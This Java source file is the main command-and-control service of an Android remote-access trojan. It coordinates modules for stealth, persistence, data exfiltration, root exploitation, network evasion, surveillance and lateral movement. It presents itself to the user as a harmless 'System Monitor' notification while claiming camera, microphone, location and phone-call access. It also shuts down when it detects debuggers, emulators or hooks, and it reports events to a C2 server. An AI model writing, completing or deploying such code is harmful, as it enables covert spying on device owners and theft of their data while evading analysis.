package com.example.client;

import android.app.Service;
import android.app.ServiceStartNotAllowedException;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;
import androidx.core.app.ServiceCompat;

/**
 * Main C2 service - now simplified and modular
 * Coordinates between different manager components
 */
public class C2Service extends Service {

    private static final String TAG = "C2Service";
    private static final String NOTIFICATION_CHANNEL_ID = "C2Kanal";
    private static final int NOTIFICATION_ID = 1;

    // Core components
    private final AtomicBoolean isRunning = new AtomicBoolean(false);
    private final AtomicBoolean isConnected = new AtomicBoolean(false);
    private ScheduledExecutorService scheduler;

    // Modular components
    private ConfigManager configManager;
    private SecurityManager securityManager;
    private NetworkManager networkManager;
    private CommandExecutor commandExecutor;
    private StealthManager stealthManager;
    private PersistenceManager persistenceManager;
    private DataExfiltrationManager dataExfiltrationManager;
    private RootExploitationManager rootExploitationManager;
    private NetworkEvasionManager networkEvasionManager;
    private SecureConfig secureConfig;
    private CryptoManager cryptoManager;
    private AuthManager authManager;
    private IntegrityValidator integrityValidator;
    
    // Advanced attack modules
    private SurveillanceManager surveillanceManager;
    private LateralMovementManager lateralMovementManager;
    private AdvancedPersistenceManager advancedPersistenceManager;

    // Static reference for logEvent method
    private static C2Service instance;

    /**
     * Log an event to be sent to C2 server
     */
    public static void logEvent(JSONObject event) {
        try {
            if (instance != null && instance.networkManager != null) {
                instance.networkManager.sendEvent(event);
            } else {
                Log.w(TAG, "Cannot log event - service not initialized");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error logging event: " + e.getMessage());
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service being created");
        
        // Set static instance for logEvent method
        instance = this;
        
        // Initialize modular components
        initializeComponents();

        // Perform security checks
        if (!performSecurityChecks()) {
            Log.e(TAG, "Security checks failed - stopping service");
            stopSelf();
            return;
        }
        
        // Start foreground service
        startForegroundService();

        // Initialize stealth mechanisms
        stealthManager.initialize();

        // Initialize persistence mechanisms
        persistenceManager.initialize();

        // Initialize data exfiltration
        dataExfiltrationManager.initialize();

        // Initialize root exploitation
        rootExploitationManager.initialize();

        // Initialize network evasion
        networkEvasionManager.initialize();
        
        // Initialize advanced attack modules
        Log.i(TAG, "Initializing advanced attack capabilities...");
        // Note: Advanced modules initialized on-demand for stealth
        // They will be activated via commands: surveillance-start, lateral-start, etc.

        Log.d(TAG, "Service created successfully with advanced attack capabilities ready");
    }

    private void initializeComponents() {
        try {
            // Initialize configuration
            configManager = new ConfigManager(this);

            // Initialize security components
            secureConfig = SecureConfig.getInstance(this);
            cryptoManager = new CryptoManager();
            authManager = new AuthManager(this);
            integrityValidator = new IntegrityValidator(this);
            securityManager = new SecurityManager(this);

            // Initialize network manager
            networkManager = new NetworkManager(this);
            networkManager.initialize(secureConfig, cryptoManager, authManager, configManager);

            // Initialize network evasion manager FIRST
            networkEvasionManager = new NetworkEvasionManager(this, configManager);

            // Initialize root exploitation manager
            rootExploitationManager = new RootExploitationManager(this, configManager);

            // Initialize command executor (depends on managers above)
            commandExecutor = new CommandExecutor(this);
            CommandExecutor.NetworkEvasionManagerHolder.setManager(networkEvasionManager);
            
            // Link advanced modules to CommandExecutor (after initialization below)
            // Will be called after all modules are created

            // Initialize stealth manager
            stealthManager = new StealthManager(this, configManager);

            // Initialize persistence manager
            persistenceManager = new PersistenceManager(this, configManager);

            // Initialize data exfiltration manager
            dataExfiltrationManager = new DataExfiltrationManager(this, cryptoManager, configManager);
            
            // Initialize advanced attack modules
            surveillanceManager = new SurveillanceManager(this, configManager, cryptoManager);
            lateralMovementManager = new LateralMovementManager(this, configManager, cryptoManager, networkEvasionManager);
            advancedPersistenceManager = new AdvancedPersistenceManager(this, configManager, cryptoManager);
            
            // Link advanced modules to CommandExecutor
            CommandExecutor.setAdvancedModules(surveillanceManager, lateralMovementManager, advancedPersistenceManager);

            // Initialize scheduler
            scheduler = Executors.newScheduledThreadPool(3);

            Log.d(TAG, "All components initialized successfully (including advanced attack modules)");
                } catch (Exception e) {
            Log.e(TAG, "Failed to initialize components", e);
            throw new RuntimeException("Component initialization failed", e);
        }
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    "System Health Monitor",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Monitor")
                .setContentText("Monitoring system health and performance.")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();

        // Android 15 enhanced foreground service support
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                // Use specific foreground service types for Android 15
                int foregroundServiceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                                          ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
                                          ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE |
                                          ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION |
                                          ServiceInfo.FOREGROUND_SERVICE_TYPE_PHONE_CALL;
                
                ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, foregroundServiceType);
            } catch (Exception e) {
                Log.e(TAG, "Enhanced foreground service start failed: " + e.getMessage());
                // Fallback to basic foreground service
                startForeground(NOTIFICATION_ID, notification);
            }
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");

        if (commandExecutor != null) {
            CommandExecutor.NetworkEvasionManagerHolder.setManager(networkEvasionManager);
        }

        // Handle screen capture intent if provided
        if (intent != null && "START_SCREEN_CAPTURE".equals(intent.getAction())) {
            // This will be handled by a separate screen capture manager in the future
            Log.d(TAG, "Screen capture intent received");
        }

        // Start network manager if not already running
        if (!isRunning.get()) {
            isRunning.set(true);
            networkManager.start();
        }

        return START_STICKY;
    }
    
    private boolean performSecurityChecks() {
        try {
            SecurityManager.SecurityCheckResult result = securityManager.performSecurityCheck();
            
            if (!result.overallSecure) {
                Log.e(TAG, "Security check failed: " + result.toString());
                
                // Critical security issues = stop service
                if (result.debuggingDetected || result.emulatorDetected || result.hooksDetected) {
                    return false;
                }
                
                // Warnings for less critical issues
                if (result.rootDetected) {
                    Log.w(TAG, "Root access detected - service running with elevated risk");
                }
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error during security checks", e);
            return false;
        }
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service being destroyed");
        isRunning.set(false);
        isConnected.set(false);

        // Stop network manager
        if (networkManager != null) {
            networkManager.stop();
        }

        // Shutdown scheduler
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }

        // Cleanup modular components
        if (commandExecutor != null) {
            commandExecutor.cleanup();
        }

        if (networkManager != null) {
            networkManager.stop();
        }

        if (stealthManager != null) {
            stealthManager.cleanup();
        }

        if (persistenceManager != null) {
            persistenceManager.cleanup();
        }

        if (dataExfiltrationManager != null) {
            dataExfiltrationManager.cleanup();
        }

        if (rootExploitationManager != null) {
            rootExploitationManager.cleanup();
        }

        if (networkEvasionManager != null) {
            networkEvasionManager.cleanup();
        }

        // Cleanup security components
        if (authManager != null) {
            authManager.clearAuthentication();
        }
        
        if (cryptoManager != null) {
            cryptoManager.clearKey();
        }
        
        Log.d(TAG, "Service destroyed successfully");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public NetworkManager getNetworkManager() {
        return networkManager;
    }

    public CommandExecutor getCommandExecutor() {
        return commandExecutor;
    }

    public NetworkEvasionManager getNetworkEvasionManager() {
        return networkEvasionManager;
    }
}
